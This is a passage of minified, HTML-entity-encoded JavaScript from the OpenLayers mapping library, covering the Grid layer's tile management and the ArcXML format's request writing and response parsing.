a&#125;();OpenLayers.Layer.Grid=OpenLayers.Class(OpenLayers.Layer.HTTPRequest,&#123;tileSize:null,tileOriginCorner:"bl",tileOrigin:null,tileOptions:null,tileClass:OpenLayers.Tile.Image,grid:null,singleTile:!1,ratio:1.5,buffer:0,transitionEffect:"resize",numLoadingTiles:0,serverResolutions:null,loading:!1,backBuffer:null,gridResolution:null,backBufferResolution:null,backBufferLonLat:null,backBufferTimerId:null,removeBackBufferDelay:null,className:null,gridLayout:null,rowSign:null,transitionendEvents:["transitionend","webkitTransitionEnd","otransitionend","oTransitionEnd"],initialize:function(a,b,c,d)&#123;OpenLayers.Layer.HTTPRequest.prototype.initialize.apply(this,arguments);this.grid=[];this._removeBackBuffer=OpenLayers.Function.bind(this.removeBackBuffer,this);this.initProperties();this.rowSign="t"===this.tileOriginCorner.substr(0,1)?1:-1&#125;,initProperties:function()&#123;void 0===this.options.removeBackBufferDelay&amp;&amp;(this.removeBackBufferDelay=this.singleTile?0:2500);void 0===this.options.className&amp;&amp;(this.className=this.singleTile?"olLayerGridSingleTile":"olLayerGrid")&#125;,setMap:function(a)&#123;OpenLayers.Layer.HTTPRequest.prototype.setMap.call(this,a);OpenLayers.Element.addClass(this.div,this.className)&#125;,removeMap:function(a)&#123;this.removeBackBuffer()&#125;,destroy:function()&#123;this.removeBackBuffer();this.clearGrid();this.tileSize=this.grid=null;OpenLayers.Layer.HTTPRequest.prototype.destroy.apply(this,arguments)&#125;,clearGrid:function()&#123;if(this.grid)&#123;for(var a=0,b=this.grid.length;a&lt;b;a++)for(var c=this.grid[a],d=0,e=c.length;d&lt;e;d++)this.destroyTile(c[d]);this.grid=[];this.gridLayout=this.gridResolution=null&#125;&#125;,addOptions:function(a,b)&#123;var c=void 0!==a.singleTile&amp;&amp;a.singleTile!==this.singleTile;OpenLayers.Layer.HTTPRequest.prototype.addOptions.apply(this,arguments);this.map&amp;&amp;c&amp;&amp;(this.initProperties(),this.clearGrid(),this.tileSize=this.options.tileSize,this.setTileSize(),this.moveTo(null,!0))&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.Grid(this.name,this.url,this.params,this.getOptions()));a=OpenLayers.Layer.HTTPRequest.prototype.clone.apply(this,[a]);null!=this.tileSize&amp;&amp;(a.tileSize=this.tileSize.clone());a.grid=[];a.gridResolution=null;a.backBuffer=null;a.backBufferTimerId=null;a.loading=!1;a.numLoadingTiles=0;return a&#125;,moveTo:function(a,b,c)&#123;OpenLayers.Layer.HTTPRequest.prototype.moveTo.apply(this,arguments);a=a||this.map.getExtent();if(null!=a)&#123;var d=!this.grid.length||b,e=this.getTilesBounds(),f=this.map.getResolution();this.getServerResolution(f);if(this.singleTile)&#123;if(d||!c&amp;&amp;!e.containsBounds(a))b&amp;&amp;"resize"!==this.transitionEffect&amp;&amp;this.removeBackBuffer(),b&amp;&amp;"resize"!==this.transitionEffect||this.applyBackBuffer(f),this.initSingleTile(a)&#125;else(d=d||!e.intersectsBounds(a,&#123;worldBounds:this.map.baseLayer.wrapDateLine&amp;&amp;this.map.getMaxExtent()&#125;))?(!b||"resize"!==this.transitionEffect&amp;&amp;this.gridResolution!==f||this.applyBackBuffer(f),this.initGriddedTiles(a)):this.moveGriddedTiles()&#125;&#125;,getTileData:function(a)&#123;var b=null,c=a.lon,d=a.lat,e=this.grid.length;if(this.map&amp;&amp;e)&#123;var f=this.map.getResolution();a=this.tileSize.w;var g=this.tileSize.h,h=this.grid[0][0].bounds,k=h.left,h=h.top;if(c&lt;k&amp;&amp;this.map.baseLayer.wrapDateLine)var l=this.map.getMaxExtent().getWidth(),m=Math.ceil((k-c)/l),c=c+l*m;c=(c-k)/(f*a);d=(h-d)/(f*g);f=Math.floor(c);k=Math.floor(d);0&lt;=k&amp;&amp;k&lt;e&amp;&amp;(e=this.grid[k][f])&amp;&amp;(b=&#123;tile:e,i:Math.floor((c-f)*a),j:Math.floor((d-k)*g)&#125;)&#125;return b&#125;,destroyTile:function(a)&#123;this.removeTileMonitoringHooks(a);a.destroy()&#125;,getServerResolution:function(a)&#123;var b=Number.POSITIVE_INFINITY;a=a||this.map.getResolution();if(this.serverResolutions&amp;&amp;-1===OpenLayers.Util.indexOf(this.serverResolutions,a))&#123;var c,d,e,f;for(c=this.serverResolutions.length-1;0&lt;=c;c--)&#123;e=this.serverResolutions[c];d=Math.abs(e-a);if(d&gt;b)break;b=d;f=e&#125;a=f&#125;return a&#125;,getServerZoom:function()&#123;var a=this.getServerResolution();return this.serverResolutions?OpenLayers.Util.indexOf(this.serverResolutions,a):this.map.getZoomForResolution(a)+(this.zoomOffset||0)&#125;,applyBackBuffer:function(a)&#123;null!==this.backBufferTimerId&amp;&amp;this.removeBackBuffer();var b=this.backBuffer;if(!b)&#123;b=this.createBackBuffer();if(!b)return;a===this.gridResolution?this.div.insertBefore(b,this.div.firstChild):this.map.baseLayer.div.parentNode.insertBefore(b,this.map.baseLayer.div);this.backBuffer=b;var c=this.grid[0][0].bounds;this.backBufferLonLat=&#123;lon:c.left,lat:c.top&#125;;this.backBufferResolution=this.gridResolution&#125;for(var c=this.backBufferResolution/a,d=b.childNodes,e,f=d.length-1;0&lt;=f;--f)e=d[f],e.style.top=(c*e._i*e._h|0)+"px",e.style.left=(c*e._j*e._w|0)+"px",e.style.width=Math.round(c*e._w)+"px",e.style.height=Math.round(c*e._h)+"px";a=this.getViewPortPxFromLonLat(this.backBufferLonLat,a);c=this.map.layerContainerOriginPx.y;b.style.left=Math.round(a.x-this.map.layerContainerOriginPx.x)+"px";b.style.top=Math.round(a.y-c)+"px"&#125;,createBackBuffer:function()&#123;var a;if(0&lt;this.grid.length)&#123;a=document.createElement("div");a.id=this.div.id+"_bb";a.className="olBackBuffer";a.style.position="absolute";var b=this.map;a.style.zIndex="resize"===this.transitionEffect?this.getZIndex()-1:b.Z_INDEX_BASE.BaseLayer-(b.getNumLayers()-b.getLayerIndex(this));for(var b=0,c=this.grid.length;b&lt;c;b++)for(var d=0,e=this.grid[b].length;d&lt;e;d++)&#123;var f=this.grid[b][d],g=this.grid[b][d].createBackBuffer();g&amp;&amp;(g._i=b,g._j=d,g._w=f.size.w,g._h=f.size.h,g.id=f.id+"_bb",a.appendChild(g))&#125;&#125;return a&#125;,removeBackBuffer:function()&#123;if(this._transitionElement)&#123;for(var a=this.transitionendEvents.length-1;0&lt;=a;--a)OpenLayers.Event.stopObserving(this._transitionElement,this.transitionendEvents[a],this._removeBackBuffer);delete this._transitionElement&#125;this.backBuffer&amp;&amp;(this.backBuffer.parentNode&amp;&amp;this.backBuffer.parentNode.removeChild(this.backBuffer),this.backBufferResolution=this.backBuffer=null,null!==this.backBufferTimerId&amp;&amp;(window.clearTimeout(this.backBufferTimerId),this.backBufferTimerId=null))&#125;,moveByPx:function(a,b)&#123;this.singleTile||this.moveGriddedTiles()&#125;,setTileSize:function(a)&#123;this.singleTile&amp;&amp;(a=this.map.getSize(),a.h=parseInt(a.h*this.ratio,10),a.w=parseInt(a.w*this.ratio,10));OpenLayers.Layer.HTTPRequest.prototype.setTileSize.apply(this,[a])&#125;,getTilesBounds:function()&#123;var a=null,b=this.grid.length;if(b)var a=this.grid[b-1][0].bounds,b=this.grid[0].length*a.getWidth(),c=this.grid.length*a.getHeight(),a=new OpenLayers.Bounds(a.left,a.bottom,a.left+b,a.bottom+c);return a&#125;,initSingleTile:function(a)&#123;this.events.triggerEvent("retile");var b=a.getCenterLonLat(),c=a.getWidth()*this.ratio;a=a.getHeight()*this.ratio;b=new OpenLayers.Bounds(b.lon-c/2,b.lat-a/2,b.lon+c/2,b.lat+a/2);c=this.map.getLayerPxFromLonLat(&#123;lon:b.left,lat:b.top&#125;);this.grid.length||(this.grid[0]=[]);(a=this.grid[0][0])?a.moveTo(b,c):(a=this.addTile(b,c),this.addTileMonitoringHooks(a),a.draw(),this.grid[0][0]=a);this.removeExcessTiles(1,1);this.gridResolution=this.getServerResolution()&#125;,calculateGridLayout:function(a,b,c)&#123;var d=c*this.tileSize.w;c*=this.tileSize.h;var e=Math.floor((a.left-b.lon)/d)-this.buffer,f=this.rowSign;a=Math[~f?"floor":"ceil"](f*(b.lat-a.top+c)/c)-this.buffer*f;return&#123;tilelon:d,tilelat:c,startcol:e,startrow:a&#125;&#125;,getTileOrigin:function()&#123;var a=this.tileOrigin;if(!a)var a=this.getMaxExtent(),b=&#123;tl:["left","top"],tr:["right","top"],bl:["left","bottom"],br:["right","bottom"]&#125;[this.tileOriginCorner],a=new OpenLayers.LonLat(a[b[0]],a[b[1]]);return a&#125;,getTileBoundsForGridIndex:function(a,b)&#123;var c=this.getTileOrigin(),d=this.gridLayout,e=d.tilelon,f=d.tilelat,g=d.startcol,d=d.startrow,h=this.rowSign;return new OpenLayers.Bounds(c.lon+(g+b)*e,c.lat-(d+a*h)*f*h,c.lon+(g+b+1)*e,c.lat-(d+(a-1)*h)*f*h)&#125;,initGriddedTiles:function(a)&#123;this.events.triggerEvent("retile");var b=this.map.getSize(),c=this.getTileOrigin(),d=this.map.getResolution(),e=this.getServerResolution(),f=d/e,d=this.tileSize.w/f,f=this.tileSize.h/f,g=Math.ceil(b.h/f)+2*this.buffer+1,b=Math.ceil(b.w/d)+2*this.buffer+1;this.gridLayout=e=this.calculateGridLayout(a,c,e);var c=e.tilelon,h=e.tilelat,e=this.map.layerContainerOriginPx.x,k=this.map.layerContainerOriginPx.y,l=this.getTileBoundsForGridIndex(0,0),m=this.map.getViewPortPxFromLonLat(new OpenLayers.LonLat(l.left,l.top));m.x=Math.round(m.x)-e;m.y=Math.round(m.y)-k;var e=[],k=this.map.getCenter(),n=0;do&#123;var p=this.grid[n];p||(p=[],this.grid.push(p));var q=0;do&#123;var l=this.getTileBoundsForGridIndex(n,q),r=m.clone();r.x+=q*Math.round(d);r.y+=n*Math.round(f);var s=p[q];s?s.moveTo(l,r,!1):(s=this.addTile(l,r),this.addTileMonitoringHooks(s),p.push(s));r=l.getCenterLonLat();e.push(&#123;tile:s,distance:Math.pow(r.lon-k.lon,2)+Math.pow(r.lat-k.lat,2)&#125;);q+=1&#125;while(l.right&lt;=a.right+c*this.buffer||q&lt;b);n+=1&#125;while(l.bottom&gt;=a.bottom-h*this.buffer||n&lt;g);this.removeExcessTiles(n,q);this.gridResolution=d=this.getServerResolution();e.sort(function(a,b)&#123;return a.distance-b.distance&#125;);a=0;for(d=e.length;a&lt;d;++a)e[a].tile.draw()&#125;,getMaxExtent:function()&#123;return this.maxExtent&#125;,addTile:function(a,b)&#123;var c=new this.tileClass(this,b,a,null,this.tileSize,this.tileOptions);this.events.triggerEvent("addtile",&#123;tile:c&#125;);return c&#125;,addTileMonitoringHooks:function(a)&#123;a.onLoadStart=function()&#123;!1===this.loading&amp;&amp;(this.loading=!0,this.events.triggerEvent("loadstart"));this.events.triggerEvent("tileloadstart",&#123;tile:a&#125;);this.numLoadingTiles++;!this.singleTile&amp;&amp;(this.backBuffer&amp;&amp;this.gridResolution===this.backBufferResolution)&amp;&amp;OpenLayers.Element.addClass(a.getTile(),"olTileReplacing")&#125;;a.onLoadEnd=function(b)&#123;this.numLoadingTiles--;b="unload"===b.type;this.events.triggerEvent("tileloaded",&#123;tile:a,aborted:b&#125;);if(!this.singleTile&amp;&amp;!b&amp;&amp;this.backBuffer&amp;&amp;this.gridResolution===this.backBufferResolution)&#123;var c=a.getTile();if("none"===OpenLayers.Element.getStyle(c,"display"))&#123;var d=document.getElementById(a.id+"_bb");d&amp;&amp;d.parentNode.removeChild(d)&#125;OpenLayers.Element.removeClass(c,"olTileReplacing")&#125;if(0===this.numLoadingTiles)&#123;if(this.backBuffer)if(0===this.backBuffer.childNodes.length)this.removeBackBuffer();else&#123;this._transitionElement=b?this.div.lastChild:a.imgDiv;b=this.transitionendEvents;for(c=b.length-1;0&lt;=c;--c)OpenLayers.Event.observe(this._transitionElement,b[c],this._removeBackBuffer);this.backBufferTimerId=window.setTimeout(this._removeBackBuffer,this.removeBackBufferDelay)&#125;this.loading=!1;this.events.triggerEvent("loadend")&#125;&#125;;a.onLoadError=function()&#123;this.events.triggerEvent("tileerror",&#123;tile:a&#125;)&#125;;a.events.on(&#123;loadstart:a.onLoadStart,loadend:a.onLoadEnd,unload:a.onLoadEnd,loaderror:a.onLoadError,scope:this&#125;)&#125;,removeTileMonitoringHooks:function(a)&#123;a.unload();a.events.un(&#123;loadstart:a.onLoadStart,loadend:a.onLoadEnd,unload:a.onLoadEnd,loaderror:a.onLoadError,scope:this&#125;)&#125;,moveGriddedTiles:function()&#123;for(var a=this.buffer+1;;)&#123;var b=this.grid[0][0],c=b.position.x+this.map.layerContainerOriginPx.x,b=b.position.y+this.map.layerContainerOriginPx.y,d=this.getServerResolution()/this.map.getResolution(),d=&#123;w:Math.round(this.tileSize.w*d),h:Math.round(this.tileSize.h*d)&#125;;if(c&gt;-d.w*(a-1))this.shiftColumn(!0,d);else if(c&lt;-d.w*a)this.shiftColumn(!1,d);else if(b&gt;-d.h*(a-1))this.shiftRow(!0,d);else if(b&lt;-d.h*a)this.shiftRow(!1,d);else break&#125;&#125;,shiftRow:function(a,b)&#123;var c=this.grid,d=a?0:c.length-1,e=a?-1:1;this.gridLayout.startrow+=e*this.rowSign;for(var f=c[d],g=c[a?"pop":"shift"](),h=0,k=g.length;h&lt;k;h++)&#123;var l=g[h],m=f[h].position.clone();m.y+=b.h*e;l.moveTo(this.getTileBoundsForGridIndex(d,h),m)&#125;c[a?"unshift":"push"](g)&#125;,shiftColumn:function(a,b)&#123;var c=this.grid,d=a?0:c[0].length-1,e=a?-1:1;this.gridLayout.startcol+=e;for(var f=0,g=c.length;f&lt;g;f++)&#123;var h=c[f],k=h[d].position.clone(),l=h[a?"pop":"shift"]();k.x+=b.w*e;l.moveTo(this.getTileBoundsForGridIndex(f,d),k);h[a?"unshift":"push"](l)&#125;&#125;,removeExcessTiles:function(a,b)&#123;for(var c,d;this.grid.length&gt;a;)&#123;var e=this.grid.pop();c=0;for(d=e.length;c&lt;d;c++)&#123;var f=e[c];this.destroyTile(f)&#125;&#125;c=0;for(d=this.grid.length;c&lt;d;c++)for(;this.grid[c].length&gt;b;)e=this.grid[c],f=e.pop(),this.destroyTile(f)&#125;,onMapResize:function()&#123;this.singleTile&amp;&amp;(this.clearGrid(),this.setTileSize())&#125;,getTileBounds:function(a)&#123;var b=this.maxExtent,c=this.getResolution(),d=c*this.tileSize.w,c=c*this.tileSize.h,e=this.getLonLatFromViewPortPx(a);a=b.left+d*Math.floor((e.lon-b.left)/d);b=b.bottom+c*Math.floor((e.lat-b.bottom)/c);return new OpenLayers.Bounds(a,b,a+d,b+c)&#125;,CLASS_NAME:"OpenLayers.Layer.Grid"&#125;);OpenLayers.Format.ArcXML=OpenLayers.Class(OpenLayers.Format.XML,&#123;fontStyleKeys:"antialiasing blockout font fontcolor fontsize fontstyle glowing interval outline printmode shadow transparency".split(" "),request:null,response:null,initialize:function(a)&#123;this.request=new OpenLayers.Format.ArcXML.Request;this.response=new OpenLayers.Format.ArcXML.Response;if(a)if("feature"==a.requesttype)&#123;this.request.get_image=null;var b=this.request.get_feature.query;this.addCoordSys(b.featurecoordsys,a.featureCoordSys);this.addCoordSys(b.filtercoordsys,a.filterCoordSys);a.polygon?(b.isspatial=!0,b.spatialfilter.polygon=a.polygon):a.envelope&amp;&amp;(b.isspatial=!0,b.spatialfilter.envelope=&#123;minx:0,miny:0,maxx:0,maxy:0&#125;,this.parseEnvelope(b.spatialfilter.envelope,a.envelope))&#125;else"image"==a.requesttype?(this.request.get_feature=null,b=this.request.get_image.properties,this.parseEnvelope(b.envelope,a.envelope),this.addLayers(b.layerlist,a.layers),this.addImageSize(b.imagesize,a.tileSize),this.addCoordSys(b.featurecoordsys,a.featureCoordSys),this.addCoordSys(b.filtercoordsys,a.filterCoordSys)):this.request=null;OpenLayers.Format.XML.prototype.initialize.apply(this,[a])&#125;,parseEnvelope:function(a,b)&#123;b&amp;&amp;4==b.length&amp;&amp;(a.minx=b[0],a.miny=b[1],a.maxx=b[2],a.maxy=b[3])&#125;,addLayers:function(a,b)&#123;for(var c=0,d=b.length;c&lt;d;c++)a.push(b[c])&#125;,addImageSize:function(a,b)&#123;null!==b&amp;&amp;(a.width=b.w,a.height=b.h,a.printwidth=b.w,a.printheight=b.h)&#125;,addCoordSys:function(a,b)&#123;"string"==typeof b?(a.id=parseInt(b),a.string=b):"object"==typeof b&amp;&amp;null!==b.proj&amp;&amp;(a.id=b.proj.srsProjNumber,a.string=b.proj.srsCode)&#125;,iserror:function(a)&#123;var b=null;a?(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]),a=a.documentElement.getElementsByTagName("ERROR"),b=null!==a&amp;&amp;0&lt;a.length):b=""!==this.response.error;return b&#125;,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=null;a&amp;&amp;a.documentElement&amp;&amp;(b="ARCXML"==a.documentElement.nodeName?a.documentElement:a.documentElement.getElementsByTagName("ARCXML")[0]);if(!b||"parsererror"===b.firstChild.nodeName)&#123;var c,d;try&#123;c=a.firstChild.nodeValue,d=a.firstChild.childNodes[1].firstChild.nodeValue&#125;catch(e)&#123;&#125;throw&#123;message:"Error parsing the ArcXML request",error:c,source:d&#125;;&#125;return this.parseResponse(b)&#125;,write:function(a)&#123;a||(a=this.request);var b=this.createElementNS("","ARCXML");b.setAttribute("version","1.1");var c=this.createElementNS("","REQUEST");if(null!=a.get_image)&#123;var d=this.createElementNS("","GET_IMAGE");c.appendChild(d);var e=this.createElementNS("","PROPERTIES");d.appendChild(e);a=a.get_image.properties;null!=a.featurecoordsys&amp;&amp;(d=this.createElementNS("","FEATURECOORDSYS"),e.appendChild(d),0===a.featurecoordsys.id?d.setAttribute("string",a.featurecoordsys.string):d.setAttribute("id",a.featurecoordsys.id));null!=a.filtercoordsys&amp;&amp;(d=this.createElementNS("","FILTERCOORDSYS"),e.appendChild(d),0===a.filtercoordsys.id?d.setAttribute("string",a.filtercoordsys.string):d.setAttribute("id",a.filtercoordsys.id));null!=a.envelope&amp;&amp;(d=this.createElementNS("","ENVELOPE"),e.appendChild(d),d.setAttribute("minx",a.envelope.minx),d.setAttribute("miny",a.envelope.miny),d.setAttribute("maxx",a.envelope.maxx),d.setAttribute("maxy",a.envelope.maxy));d=this.createElementNS("","IMAGESIZE");e.appendChild(d);d.setAttribute("height",a.imagesize.height);d.setAttribute("width",a.imagesize.width);if(a.imagesize.height!=a.imagesize.printheight||a.imagesize.width!=a.imagesize.printwidth)d.setAttribute("printheight",a.imagesize.printheight),d.setArrtibute("printwidth",a.imagesize.printwidth);null!=a.background&amp;&amp;(d=this.createElementNS("","BACKGROUND"),e.appendChild(d),d.setAttribute("color",a.background.color.r+","+a.background.color.g+","+a.background.color.b),null!==a.background.transcolor&amp;&amp;d.setAttribute("transcolor",a.background.transcolor.r+","+a.background.transcolor.g+","+a.background.transcolor.b));if(null!=a.layerlist&amp;&amp;0&lt;a.layerlist.length)for(d=this.createElementNS("","LAYERLIST"),e.appendChild(d),e=0;e&lt;a.layerlist.length;e++)&#123;var f=this.createElementNS("","LAYERDEF");d.appendChild(f);f.setAttribute("id",a.layerlist[e].id);f.setAttribute("visible",a.layerlist[e].visible);if("object"==typeof a.layerlist[e].query)&#123;var g=a.layerlist[e].query;if(0&gt;g.where.length)continue;var h=null,h="boolean"==typeof g.spatialfilter&amp;&amp;g.spatialfilter?this.createElementNS("","SPATIALQUERY"):this.createElementNS("","QUERY");h.setAttribute("where",g.where);"number"==typeof g.accuracy&amp;&amp;0&lt;g.accuracy&amp;&amp;h.setAttribute("accuracy",g.accuracy);"number"==typeof g.featurelimit&amp;&amp;2E3&gt;g.featurelimit&amp;&amp;h.setAttribute("featurelimit",g.featurelimit);"string"==typeof g.subfields&amp;&amp;"#ALL#"!=g.subfields&amp;&amp;h.setAttribute("subfields",g.subfields);"string"==typeof g.joinexpression&amp;&amp;0&lt;g.joinexpression.length&amp;&amp;h.setAttribute("joinexpression",g.joinexpression);"string"==typeof g.jointables&amp;&amp;0&lt;g.jointables.length&amp;&amp;h.setAttribute("jointables",g.jointables);f.appendChild(h)&#125;"object"==typeof a.layerlist[e].renderer&amp;&amp;this.addRenderer(f,a.layerlist[e].renderer)&#125;&#125;else null!=a.get_feature&amp;&amp;(d=this.createElementNS("","GET_FEATURES"),d.setAttribute("outputmode","newxml"),d.setAttribute("checkesc","true"),a.get_feature.geometry?d.setAttribute("geometry",a.get_feature.geometry):d.setAttribute("geometry","false"),a.get_feature.compact&amp;&amp;d.setAttribute("compact",a.get_feature.compact),"number"==a.get_feature.featurelimit&amp;&amp;d.setAttribute("featurelimit",a.get_feature.featurelimit),d.setAttribute("globalenvelope","true"),c.appendChild(d),null!=a.get_feature.layer&amp;&amp;0&lt;a.get_feature.layer.length&amp;&amp;(e=this.createElementNS("","LAYER"),e.setAttribute("id",a.get_feature.layer),d.appendChild(e)),a=a.get_feature.query,null!=a&amp;&amp;(e=null,e=a.isspatial?this.createElementNS("","SPATIALQUERY"):this.createElementNS("","QUERY"),d.appendChild(e),"number"==typeof a.accuracy&amp;&amp;e.setAttribute("accuracy",a.accuracy),null!=a.featurecoordsys&amp;&amp;(d=this.createElementNS("","FEATURECOORDSYS"),0==a.featurecoordsys.id?d.setAttribute("string",a.featurecoordsys.string):d.setAttribute("id",a.featurecoordsys.id),e.appendChild(d)),null!=a.filtercoordsys&amp;&amp;(d=this.createElementNS("","FILTERCOORDSYS"),0===a.filtercoordsys.id?d.setAttribute("string",a.filtercoordsys.string):d.setAttribute("id",a.filtercoordsys.id),e.appendChild(d)),0&lt;a.buffer&amp;&amp;(d=this.createElementNS("","BUFFER"),d.setAttribute("distance",a.buffer),e.appendChild(d)),a.isspatial&amp;&amp;(d=this.createElementNS("","SPATIALFILTER"),d.setAttribute("relation",a.spatialfilter.relation),e.appendChild(d),a.spatialfilter.envelope?(f=this.createElementNS("","ENVELOPE"),f.setAttribute("minx",a.spatialfilter.envelope.minx),f.setAttribute("miny",a.spatialfilter.envelope.miny),f.setAttribute("maxx",a.spatialfilter.envelope.maxx),f.setAttribute("maxy",a.spatialfilter.envelope.maxy),d.appendChild(f)):"object"==typeof a.spatialfilter.polygon&amp;&amp;d.appendChild(this.writePolygonGeometry(a.spatialfilter.polygon))),null!=a.where&amp;&amp;0&lt;a.where.length&amp;&amp;e.setAttribute("where",a.where)));b.appendChild(c);return OpenLayers.Format.XML.prototype.write.apply(this,[b])&#125;,addGroupRenderer:function(a,b)&#123;var c=this.createElementNS("","GROUPRENDERER");a.appendChild(c);for(var d=0;d&lt;b.length;d++)this.addRenderer(c,b[d])&#125;,addRenderer:function(a,b)&#123;if(OpenLayers.Util.isArray(b))this.addGroupRenderer(a,b);else&#123;var c=this.createElementNS("",b.type.toUpperCase()+"RENDERER");a.appendChild(c);"VALUEMAPRENDERER"==c.tagName?this.addValueMapRenderer(c,b):"VALUEMAPLABELRENDERER"==c.tagName?this.addValueMapLabelRenderer(c,b):"SIMPLELABELRENDERER"==c.tagName?this.addSimpleLabelRenderer(c,b):"SCALEDEPENDENTRENDERER"==c.tagName&amp;&amp;this.addScaleDependentRenderer(c,b)&#125;&#125;,addScaleDependentRenderer:function(a,b)&#123;"string"!=typeof b.lower&amp;&amp;"number"!=typeof b.lower||a.setAttribute("lower",b.lower);"string"!=typeof b.upper&amp;&amp;"number"!=typeof b.upper||a.setAttribute("upper",b.upper);this.addRenderer(a,b.renderer)&#125;,addValueMapLabelRenderer:function(a,b)&#123;a.setAttribute("lookupfield",b.lookupfield);a.setAttribute("labelfield",b.labelfield);if("object"==typeof b.exacts)for(var c=0,d=b.exacts.length;c&lt;d;c++)&#123;var e=b.exacts[c],f=this.createElementNS("","EXACT");"string"==typeof e.value&amp;&amp;f.setAttribute("value",e.value);"string"==typeof e.label&amp;&amp;f.setAttribute("label",e.label);"string"==typeof e.method&amp;&amp;f.setAttribute("method",e.method);a.appendChild(f);if("object"==typeof e.symbol)&#123;var g=null;"text"==e.symbol.type&amp;&amp;(g=this.createElementNS("","TEXTSYMBOL"));if(null!=g)&#123;for(var h=this.fontStyleKeys,k=0,l=h.length;k&lt;l;k++)&#123;var m=h[k];e.symbol[m]&amp;&amp;g.setAttribute(m,e.symbol[m])&#125;f.appendChild(g)&#125;&#125;&#125;&#125;,addValueMapRenderer:function(a,b)&#123;a.setAttribute("lookupfield",b.lookupfield);if("object"==typeof b.ranges)for(var c=0,d=b.ranges.length;c&lt;d;c++)&#123;var e=b.ranges[c],f=this.createElementNS("","RANGE");f.setAttribute("lower",e.lower);f.setAttribute("upper",e.upper);a.appendChild(f);if("object"==typeof e.symbol)&#123;var g=null;"simplepolygon"==e.symbol.type&amp;&amp;(g=this.createElementNS("","SIMPLEPOLYGONSYMBOL"));null!=g&amp;&amp;("string"==typeof e.symbol.boundarycolor&amp;&amp;g.setAttribute("boundarycolor",e.symbol.boundarycolor),"string"==typeof e.symbol.fillcolor&amp;&amp;g.setAttribute("fillcolor",e.symbol.fillcolor),"number"==typeof e.symbol.filltransparency&amp;&amp;g.setAttribute("filltransparency",e.symbol.filltransparency),f.appendChild(g))&#125;&#125;else if("object"==typeof b.exacts)for(c=0,d=b.exacts.length;c&lt;d;c++)e=b.exacts[c],f=this.createElementNS("","EXACT"),"string"==typeof e.value&amp;&amp;f.setAttribute("value",e.value),"string"==typeof e.label&amp;&amp;f.setAttribute("label",e.label),"string"==typeof e.method&amp;&amp;f.setAttribute("method",e.method),a.appendChild(f),"object"==typeof e.symbol&amp;&amp;(g=null,"simplemarker"==e.symbol.type&amp;&amp;(g=this.createElementNS("","SIMPLEMARKERSYMBOL")),null!=g&amp;&amp;("string"==typeof e.symbol.antialiasing&amp;&amp;g.setAttribute("antialiasing",e.symbol.antialiasing),"string"==typeof e.symbol.color&amp;&amp;g.setAttribute("color",e.symbol.color),"string"==typeof e.symbol.outline&amp;&amp;g.setAttribute("outline",e.symbol.outline),"string"==typeof e.symbol.overlap&amp;&amp;g.setAttribute("overlap",e.symbol.overlap),"string"==typeof e.symbol.shadow&amp;&amp;g.setAttribute("shadow",e.symbol.shadow),"number"==typeof e.symbol.transparency&amp;&amp;g.setAttribute("transparency",e.symbol.transparency),"string"==typeof e.symbol.usecentroid&amp;&amp;g.setAttribute("usecentroid",e.symbol.usecentroid),"number"==typeof e.symbol.width&amp;&amp;g.setAttribute("width",e.symbol.width),f.appendChild(g)))&#125;,addSimpleLabelRenderer:function(a,b)&#123;a.setAttribute("field",b.field);for(var c="featureweight howmanylabels labelbufferratio labelpriorities labelweight linelabelposition rotationalangles".split(" "),d=0,e=c.length;d&lt;e;d++)&#123;var f=c[d];b[f]&amp;&amp;a.setAttribute(f,b[f])&#125;if("text"==b.symbol.type)&#123;var g=b.symbol,h=this.createElementNS("","TEXTSYMBOL");a.appendChild(h);c=this.fontStyleKeys;d=0;for(e=c.length;d&lt;e;d++)f=c[d],g[f]&amp;&amp;h.setAttribute(f,b[f])&#125;&#125;,writePolygonGeometry:function(a)&#123;if(!(a instanceof OpenLayers.Geometry.Polygon))throw&#123;message:"Cannot write polygon geometry to ArcXML with an "+a.CLASS_NAME+" object.",geometry:a&#125;;for(var b=this.createElementNS("","POLYGON"),c=0,d=a.components.length;c&lt;d;c++)&#123;for(var e=a.components[c],f=this.createElementNS("","RING"),g=0,h=e.components.length;g&lt;h;g++)&#123;var k=e.components[g],l=this.createElementNS("","POINT");l.setAttribute("x",k.x);l.setAttribute("y",k.y);f.appendChild(l)&#125;b.appendChild(f)&#125;return b&#125;,parseResponse:function(a)&#123;"string"==typeof a&amp;&amp;(a=(new OpenLayers.Format.XML).read(a));var b=new OpenLayers.Format.ArcXML.Response,c=a.getElementsByTagName("ERROR");if(null!=c&amp;&amp;0&lt;c.length)b.error=this.getChildValue(c,"Unknown error.");else&#123;c=a.getElementsByTagName("RESPONSE");if(null==c||0==c.length)return b.error="No RESPONSE tag found in ArcXML response.",b;var d=c[0].firstChild.nodeName;"#text"==d&amp;&amp;(d=c[0].firstChild.nextSibling.nodeName);if("IMAGE"==d)c=a.getElementsByTagName("ENVELOPE"),a=a.getElementsByTagName("OUTPUT"),null==c||0==c.length?b.error="No ENVELOPE tag found in ArcXML response.":null==a||0==a.length?b.error="No OUTPUT tag found in ArcXML response.":(c=this.parseAttributes(c[0]),d=this.parseAttributes(a[0]),b.image="string"==typeof d.type?&#123;envelope:c,output:&#123;type:d.type,data:this.getChildValue(a[0])&#125;&#125;:&#123;envelope:c,output:d&#125;);else if("FEATURES"==d)&#123;if(a=c[0].getElementsByTagName("FEATURES"),c=a[0].getElementsByTagName("FEATURECOUNT"),b.features.featurecount=c[0].getAttribute("count"),0&lt;b.features.featurecount)for(c=a[0].getElementsByTagName("ENVELOPE"),b.features.envelope=this.parseAttributes(c[0],"number"),a=a[0].getElementsByTagName("FEATURE"),c=0;c&lt;a.length;c++)&#123;for(var d=new OpenLayers.Feature.Vector,e=a[c].getElementsByTagName("FIELD"),f=0;f&lt;e.length;f++)&#123;var g=e[f].getAttribute("name"),h=e[f].getAttribute("value");d.attributes[g]=h&#125;e=a[c].getElementsByTagName("POLYGON");if(0&lt;e.length)&#123;e=e[0].getElementsByTagName("RING");f=[];for(g=0;g&lt;e.length;g++)&#123;h=[];h.push(this.parsePointGeometry(e[g]));for(var k=e[g].getElementsByTagName("HOLE"),l=0;l&lt;k.length;l++)h.push(this.parsePointGeometry(k[l]));f.push(new OpenLayers.Geometry.Polygon(h))&#125;d.geometry=1==f.length?f[0]:new OpenLayers.Geometry.MultiPolygon(f)&#125;b.features.feature.push(d)&#125;&#125;else b.error="Unidentified response 